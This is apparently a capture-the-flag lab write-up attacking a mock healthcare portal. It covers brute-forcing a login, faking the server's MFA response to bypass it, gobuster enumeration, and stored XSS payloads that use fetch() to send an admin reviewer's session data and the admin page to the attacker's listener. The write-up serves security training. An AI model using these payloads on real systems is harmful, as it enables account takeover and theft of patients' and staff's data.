---

Name: Health Smarter
Difficulty: Medium
URL: https://www.hacksmarter.org/events/7f9dc321-77ce-49b8-8acc-5c224ef25d8d/take/health-smarter-medium
Description: 

---

We can use Caido to brute force the login credentials

After a while we find them:
```bash
m.thompson@healthsmarter.hsm
Care4All!
```

We are now required to enter a 6-digit multi-factor verification code

I've started brute forcing it with Caido, but after a some tries the response changed from
```json
{"success":false,"message":"Invalid verification code."}
```

To:
```json
{"success":false,"message":"Verification code expired."}
```

I've deciced to catch the response from the server and modify it:
```json
{"success":true,"message":"Hope it works"}
```

I got redirected to /undefined, so maybe I need to specify the path I want to be taken too

Using gobuster we find that we likely want to go to dashboard.html
```bash
$ gobuster dir -u http://10.1.247.112/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -t 100 -x txt,php,html,bak,zip,log,old,js -k
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.1.247.112/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              zip,log,old,js,txt,php,html,bak
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
ADMIN.html           (Status: 403) [Size: 23]
Admin.html           (Status: 403) [Size: 23]
admin.html           (Status: 403) [Size: 23]
css                  (Status: 301) [Size: 153] [--> /css/]
dashboard.html       (Status: 302) [Size: 33] [--> /login.html]
login.html           (Status: 200) [Size: 3663]
Progress: 42759 / 42759 (100.00%)
===============================================================
Finished
===============================================================
```

Changing the response to:
```json
{"success":true,"message":"Good luck","redirect":"dashboard.html"}
```

Enables us to login successfully

We can update our info
```txt
If you need to update your address, phone number, or request medical records, please submit a request to the admin staff using the helpdesk ticketing portal on the side.
```

Can I fuzz for additional files?
```
connect.sid
s%3A7V5M7ViWy3jLHupFgU4YsD_fZd6X6dBW.EpPVdIz0TKDxJs5mlBAqKypItmV75pX0ov6%2B0WkQYHw

gobuster dir \
-u http://10.1.247.112/ \
-w /usr/share/seclists/Discovery/Web-Content/common.txt \
-H "Cookie: connect.sid=s%3A7V5M7ViWy3jLHupFgU4YsD_fZd6X6dBW.EpPVdIz0TKDxJs5mlBAqKypItmV75pX0ov6%2B0WkQYHw" \
-x js,html,php,json

```

After submitting a ticket we get this response
```json
{"success":true,"message":"Support ticket submitted successfully. A representative will review it shortly."}
```

Since it mentions it will be reviewed I think we should test for XSS

We can try with a simple payload
```html
<img src="http://10.200.77.254:4444/xss-test">
```

We start a python http server
```bash
$ python3 -m http.server 4444
Serving HTTP on 0.0.0.0 port 4444 (http://0.0.0.0:4444/) ...
10.1.247.112 - - [07/Aug/2026 15:57:29] code 404, message File not found
10.1.247.112 - - [07/Aug/2026 15:57:29] "GET /xss-test HTTP/1.1" 404 -
10.1.247.112 - - [07/Aug/2026 15:57:30] code 404, message File not found
10.1.247.112 - - [07/Aug/2026 15:57:30] "GET /xss-test HTTP/1.1" 404 -
```

We test if javascript is executed
```html
<img src="x" onerror="fetch('http://10.200.77.254:4444/js-executed')">
```

It is, great, now we can steal their cookies
```bash
10.1.247.112 - - [07/Aug/2026 15:58:46] code 404, message File not found
10.1.247.112 - - [07/Aug/2026 15:58:46] "GET /js-executed HTTP/1.1" 404 -
10.1.247.112 - - [07/Aug/2026 15:58:47] code 404, message File not found
10.1.247.112 - - [07/Aug/2026 15:58:47] "GET /xss-test HTTP/1.1" 404 -
10.1.247.112 - - [07/Aug/2026 15:58:47] code 404, message File not found
10.1.247.112 - - [07/Aug/2026 15:58:47] "GET /js-executed HTTP/1.1" 404 -
```

Since going to /api/session-info reveals info about your session, let's find more about this reviewer

```html
<img src=x onerror="
fetch('/api/session-info')
  .then(r => r.text())
  .then(d => fetch('http://10.200.77.254:4444/session?d=' + encodeURIComponent(d)));
">
```

We get this request
```bash
10.1.247.112 - - [07/Aug/2026 16:05:50] "GET /session?d=%7B%22username%22%3A%22e.kennedy%40healthsmarter.hsm%22%2C%22name%22%3A%22Dr.%20Elizabeth%20Kennedy%22%2C%22role%22%3A%22Admin%22%2C%22mfaVerified%22%3Atrue%7D HTTP/1.1" 404 -
```

After we URL Decode it, we find that it is an admin user
```bash
{"username":"e.kennedy@healthsmarter.hsm","name":"Dr. Elizabeth Kennedy","role":"Admin","mfaVerified":true}
```

That means we can view what admin.html hides
```html
<img src=x onerror="
fetch('/admin.html')
  .then(r => r.text())
  .then(d => fetch('http://10.200.77.254:4444/admin?d=' + encodeURIComponent(d)));
">
```

We get the entire page, after URL decoding it and searching for `HSM{` we find the last flag
